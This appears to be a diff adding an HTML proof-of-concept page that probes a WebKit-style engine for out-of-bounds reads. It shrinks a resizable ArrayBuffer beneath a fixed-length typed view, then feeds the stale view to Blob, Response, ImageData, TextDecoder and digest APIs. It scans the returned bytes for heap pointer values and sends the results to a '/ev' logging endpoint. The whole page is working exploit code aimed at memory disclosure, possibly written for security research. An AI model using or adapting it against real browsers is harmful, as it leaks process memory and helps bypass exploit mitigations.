@@ -1,0 +1,83 @@
+<!doctype html><html><head><meta charset="utf-8"><title>oob2</title>
+<script>
+'use strict';
+/* docs/95 part 10: a *fixed-length* view over a resizable ArrayBuffer, then the buffer shrinks.
+   That is the one state `wrappedAs()` deliberately lets into WebCore ("it will be just recognized
+   as OOB TypedArray"), and the state where ArrayBufferView::byteLength() decides whether WebCore
+   sees 0 (upstream) or the stale raw length (this drop's inverted test). */
+var Q=[],PUMPING=false,SENT=0;
+function send(e){ return new Promise(function(res){ var im=new Image(),d=false;
+  function fin(){ if(d)return; d=true; res(); } im.onload=fin; im.onerror=fin;
+  im.src='/ev?m='+encodeURIComponent(e); setTimeout(fin,250); }); }
+function pump(){ if(PUMPING)return; PUMPING=true; (async function(){ while(Q.length){ await send(Q.shift()); SENT++; } PUMPING=false; })(); }
+function add(k,v){ Q.push(k+'='+String(v).replace(/[\t\r\n]+/g,' ').slice(0,240)); pump(); }
+window.onerror=function(m,s,l,c){ add('ONERROR',m+' @'+l); return false; };
+new Image().src='/ev?m=BOOT+oob2';
+
+function hex(u,n){ var h='',i; for(i=0;i<Math.min(n||24,u.length);i++) h+=(u[i]<16?'0':'')+u[i].toString(16); return h; }
+function ptrscan(b){
+  var hits=[],i,j;
+  for(j=0;j<8;j++) for(i=j;i+8<=b.length;i+=8){
+    if(b[i+6]===0 && b[i+7]===0 && b[i+5]>=0x60 && b[i+5]<=0x7f && (b[i]|b[i+1]|b[i+2]|b[i+3]|b[i+4])!==0){
+      var hx=''; for(var k=7;k>=0;k--) hx+=(b[i+k]<16?'0':'')+b[i+k].toString(16);
+      hits.push('@'+i+'=0x'+hx);
+    }
+  }
+  return 'ptr='+hits.length+(hits.length?('['+hits.slice(0,4).join(',')+']'):'');
+}
+function err(e){ return (e&&e.name)+': '+(e&&e.message); }
+
+/* a fixed-length view: new Uint8Array(buffer, 0, 4096) is NOT length-tracking */
+var AB = new ArrayBuffer(4096, {maxByteLength: 4096});
+var V = new Uint8Array(AB, 0, 4096);
+for (var i=0;i<4096;i++) V[i]=(i*13+7)&0xff;
+V[0]=0xde; V[1]=0xad; V[2]=0xbe; V[3]=0xef;
+add('pre', 'jsBL='+V.byteLength+' buf='+AB.byteLength);
+
+AB.resize(16);
+add('post', 'jsBL='+V.byteLength+' buf='+AB.byteLength+' v0='+V[0]+' v100='+(V[100]===undefined?'undef':V[100]));
+
+/* union consumers: a stale length shows up as a size far beyond 16 */
+try { add('blob','blob='+new Blob([V]).size); } catch(e){ add('blob',err(e)); }
+try { add('td','len='+new TextDecoder().decode(V).length+' head='+JSON.stringify(new TextDecoder().decode(V).slice(0,8))); } catch(e){ add('td',err(e)); }
+try { new Response(V).arrayBuffer().then(function(b){
+        var u=new Uint8Array(b);
+        add('resp','len='+b.byteLength+' '+hex(u)+' '+ptrscan(u));
+      }, function(e){ add('resp',err(e)); });
+} catch(e){ add('resp',err(e)); }
+
+/* typed (non-union) consumers */
+try { var C=new Uint8ClampedArray(AB,0,4096); AB.resize(16);
+      var id=new ImageData(C, 32, 32); add('imgdata','ok len='+id.data.length+' '+hex(id.data)+' '+ptrscan(id.data)); }
+catch(e){ add('imgdata', err(e)+' jsBL='+(typeof C!=='undefined'?C.byteLength:'?')); }
+
+/* read the bytes of a Blob built from an OOB view, if the Blob has any */
+setTimeout(function(){
+  try{
+    var b2=new Blob([V]);
+    b2.arrayBuffer().then(function(ab){
+      var g=new Uint8Array(ab);
+      add('blob_bytes','size='+g.length+' '+hex(g)+' '+ptrscan(g));
+    }, function(e){ add('blob_bytes',err(e)); });
+  }catch(e){ add('blob_bytes',err(e)); }
+}, 800);
+
+/* digest: 16 vs 4096 bytes gives a different hash; compare with the same page grown back to 4096 */
+try {
+  var ab3=new ArrayBuffer(4096,{maxByteLength:4096}); var v3=new Uint8Array(ab3,0,4096);
+  for(var k=0;k<4096;k++) v3[k]=0x41;
+  crypto.subtle.digest('SHA-256', v3).then(function(d){
+    var h=''; new Uint8Array(d).forEach(function(x){h+=(x<16?'0':'')+x.toString(16);});
+    add('digest_full', h);
+  }, function(e){ add('digest_full', err(e)); });
+  var ab4=new ArrayBuffer(4096,{maxByteLength:4096}); var v4=new Uint8Array(ab4,0,4096);
+  for(var k2=0;k2<4096;k2++) v4[k2]=0x41;
+  ab4.resize(16);
+  crypto.subtle.digest('SHA-256', v4).then(function(d){
+    var h=''; new Uint8Array(d).forEach(function(x){h+=(x<16?'0':'')+x.toString(16);});
+    add('digest_oob', h+' (same hash as digest_full means the whole 4096 bytes were read)');
+  }, function(e){ add('digest_oob', err(e)); });
+} catch(e){ add('digest_setup', err(e)); }
+
+setTimeout(function(){ add('DONE','sent='+SENT); document.title='DONE'; }, 2500);
+</script></head><body><p>oob2</p></body></html>
